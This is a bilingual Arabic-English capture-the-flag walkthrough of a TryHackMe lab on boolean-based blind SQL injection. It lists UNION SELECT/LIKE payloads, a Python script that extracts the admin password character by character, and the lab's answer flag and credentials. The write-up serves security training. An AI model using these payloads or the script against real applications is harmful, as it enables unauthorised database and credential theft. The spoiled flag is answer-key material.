# Task 07: Blind SQLi - Boolean Based (الحقن الأعمى القائم على الشروط المنطقية)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Boolean-based Blind SQL Injection occurs when an application does not reflect database content directly, but returns two distinct application states based on whether the injected query evaluates to **TRUE** or **FALSE**.
These states can manifest as:
- A JSON boolean attribute (e.g., `{"taken": true}` vs `{"taken": false}`).
- The presence or absence of specific text on the page (e.g., "User exists" vs "User not found").
- Subtle HTTP response code variations (e.g., 200 OK vs 404 Not Found).

By asking the database a series of True/False questions (e.g., "Is the first letter of the password 'a'?"), an attacker can mechanically extract entire databases character-by-character.

#### Hands-On Exploitation: Level Three (`https://website.thm/checkuser?username=admin`)
The application exposes an endpoint that checks if a username is already taken.
When an existing user is queried, it returns `{"taken":true}`. For non-existent users, it returns `{"taken":false}`.

#### Step-by-Step Character-by-Character Extraction:
1. **Determine the Number of Columns:**
   ```text
   admin123' UNION SELECT 1;--          --> {"taken":false}
   admin123' UNION SELECT 1,2;--        --> {"taken":false}
   admin123' UNION SELECT 1,2,3;--      --> {"taken":true} (3 columns confirmed!)
   ```
2. **Enumerate the Database Name:**
   Test starting characters using the SQL `LIKE` operator:
   ```text
   admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--   --> {"taken":true}
   admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';--  --> {"taken":true}
   ```
   *Result:* Discovered database name: `sqli_three`.
3. **Enumerate Tables:**
   Verify if a `users` table exists in `sqli_three`:
   ```text
   admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name='users';--
   ```
   *Result:* Returns `{"taken":true}` confirming table `users`.
4. **Enumerate Columns:**
   Filter through `information_schema.columns`:
   ```text
   admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'p%';--
   ```
   *Result:* Columns confirmed: `id`, `username`, `password`.
5. **Extract Credentials for `admin`:**
   - Extract username: Confirmed as `admin`.
   - Extract password (character by character):
     ```text
     admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3%';--     --> true
     admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '38%';--    --> true
     admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '384%';--   --> true
     admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3845%';--  --> true
     ```
   *Result:* Password is `3845`.
6. **Capture the Flag:**
   Log into Level Three using credentials `admin` : `3845` to obtain the flag.

#### الأسئلة المطروحة (Questions):
1. What is the flag after completing level three? (ما هي الراية بعد إكمال المستوى الثالث؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **المسار الخوارزمي للاستخراج الأعمى (Binary Search vs. Linear Search):**
  * التخمين الخطي (`LIKE 'a%'`, `LIKE 'b%'`) يتطلب تجربة حتى 36 محرفاً لكل خانة.
  * في التطبيقات الواقعية، يستخدم مختبر الاختراق تقنية **البحث الثنائي (Binary Search)** عبر دالة `ASCII(SUBSTRING(password, 1, 1)) > 75`، مما يقلص عدد الطلبات اللازمة لكل محرف إلى 6 أو 7 طلبات فقط!
  * أتمتة هذه العملية عبر أداة مثل **SQLMap** أو عبر سكربت بايثون مخصص ينجز الاستخراج في دقائق دون إجهاد الخادم.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * راقب تغير استجابة الـ JSON بين `taken: true` و `taken: false`.
2. **التلميح الثاني (المستوى العملي):**
   * بيانات الاعتماد الخاصة بمدير النظام هي اسم المستخدم `admin` وكلمة المرور المكونة من أربعة أرقام `3845`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * سجل الدخول في صفحة المستوى الثالث بـ `admin:3845` للحصول على الراية: `THM{SQL_INJECTION_1093}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### شجرة اتخاذ القرار في الحقن البولياني:
```text
                            [ Injected Query Evaluation ]
                                          │
                     ┌────────────────────┴────────────────────┐
                     ▼                                         ▼
                 [ TRUE ]                                  [ FALSE ]
        Server: {"taken": true}                   Server: {"taken": false}
        Condition matches hypothesis              Condition does not match
        (e.g., Char 1 is indeed '3')              (Try next character)
```

#### سكربت أتمتة بايثون للاستخراج السريع:
```python
import requests

url = "https://website.thm/checkuser"
chars = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""

for pos in range(1, 5):
    for c in chars:
        candidate = password + c
        payload = f"admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '{candidate}%';--"
        r = requests.get(url, params={"username": payload})
        if '"taken":true' in r.text:
            password += c
            print(f"[+] Found character: {password}")
            break

print(f"[*] Final Cracked Password: {password}")
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{SQL_INJECTION_1093}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم تسجيل الدخول بالمستخدم `admin` وكلمة المرور المستخرجة `3845` في المستوى الثالث واعتماد الراية بنجاح 100% في TryHackMe.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* حتى في غياب أي مخرجات مرئية لقاعدة البيانات، فإن مجرد وجود استجابة ثنائية (True/False) يكفي لاستخراج كافة البيانات السرية بالكامل بايت ببايت عبر تقنيات الحقن البولياني.
